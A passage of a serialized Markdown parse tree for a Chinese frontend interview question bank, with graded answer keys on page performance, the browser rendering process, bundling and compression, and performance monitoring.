代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","tokens":[{"type":"text","raw":"**1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","text":"**1：** 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","text":" 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。\\n","task":false,"loose":false,"text":"**1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","tokens":[{"type":"text","raw":"**1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","text":"**1：** 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","text":" 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。\\n","task":false,"loose":false,"text":"**1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","tokens":[{"type":"text","raw":"**1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","text":"**1：** 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","text":" 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。\\n","task":false,"loose":false,"text":"**1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","tokens":[{"type":"text","raw":"**1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","text":"**1：** 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","text":" 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","task":false,"loose":false,"text":"**1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","tokens":[{"type":"text","raw":"**1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","text":"**1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","text":" 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 介绍一下浏览器渲染过程\\n\\n","depth":2,"text":"介绍一下浏览器渲染过程","tokens":[{"type":"text","raw":"介绍一下浏览器渲染过程","text":"介绍一下浏览器渲染过程","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **5：** 浏览器的渲染过程主要包括以下几个步骤：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **5：** 浏览器的渲染过程主要包括以下几个步骤：","task":false,"loose":false,"text":"**5：** 浏览器的渲染过程主要包括以下几个步骤：","tokens":[{"type":"text","raw":"**5：** 浏览器的渲染过程主要包括以下几个步骤：","text":"**5：** 浏览器的渲染过程主要包括以下几个步骤：","tokens":[{"type":"strong","raw":"**5：**","text":"5：","tokens":[{"type":"text","raw":"5：","text":"5：","escaped":false}]},{"type":"text","raw":" 浏览器的渲染过程主要包括以下几个步骤：","text":" 浏览器的渲染过程主要包括以下几个步骤：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n >构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n >合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n >布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n >绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","tokens":[{"type":"paragraph","raw":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","text":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","tokens":[{"type":"text","raw":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。","text":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。","text":"构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。","text":"合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。","text":"布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","text":"绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","escaped":false}]}],"text":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  "},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何减少页面渲染时间？\\n\\n","depth":2,"text":"如何减少页面渲染时间？","tokens":[{"type":"text","raw":"如何减少页面渲染时间？","text":"如何减少页面渲染时间？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  \\n- **1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  \\n- **1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  \\n- **1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  \\n- **1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  \\n- **1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  \\n","task":false,"loose":false,"text":"**1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","tokens":[{"type":"text","raw":"**1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","text":"**1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","text":" 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  \\n","task":false,"loose":false,"text":"**1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","tokens":[{"type":"text","raw":"**1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","text":"**1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","text":" 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  \\n","task":false,"loose":false,"text":"**1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","tokens":[{"type":"text","raw":"**1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","text":"**1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","text":" 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  \\n","task":false,"loose":false,"text":"**1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","tokens":[{"type":"text","raw":"**1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","text":"**1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","text":" 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  \\n","task":false,"loose":false,"text":"**1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","tokens":[{"type":"text","raw":"**1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","text":"**1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","text":" 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","task":false,"loose":false,"text":"**1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","tokens":[{"type":"text","raw":"**1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","text":"**1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","text":" 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"heading","raw":"## 如何进行前端代码的打包和压缩，提高页面加载速度？\\n\\n","depth":2,"text":"如何进行前端代码的打包和压缩，提高页面加载速度？","tokens":[{"type":"text","raw":"如何进行前端代码的打包和压缩，提高页面加载速度？","text":"如何进行前端代码的打包和压缩，提高页面加载速度？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。\\n- **1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。\\n- **1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。\\n- **1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。\\n- **1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。\\n- **1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。\\n- **1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。\\n","task":false,"loose":false,"text":"**1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","tokens":[{"type":"text","raw":"**1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","text":"**1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","text":" 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。\\n","task":false,"loose":false,"text":"**1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","tokens":[{"type":"text","raw":"**1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","text":"**1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","text":" 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。\\n","task":false,"loose":false,"text":"**1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","tokens":[{"type":"text","raw":"**1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","text":"**1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","text":" 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。\\n","task":false,"loose":false,"text":"**1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","tokens":[{"type":"text","raw":"**1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","text":"**1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","text":" 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。\\n","task":false,"loose":false,"text":"**1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","tokens":[{"type":"text","raw":"**1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","text":"**1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","text":" 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。\\n","task":false,"loose":false,"text":"**1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","tokens":[{"type":"text","raw":"**1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","text":"**1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","text":" 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","task":false,"loose":false,"text":"**1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","tokens":[{"type":"text","raw":"**1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","text":"**1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","text":" CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何实现前端性能监控？\\n\\n","depth":2,"text":"如何实现前端性能监控？","tokens":[{"type":"text","raw":"如何实现前端性能监控？","text":"如何实现前端性能监控？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 性能监控工具：使用性能监控工具（如Google 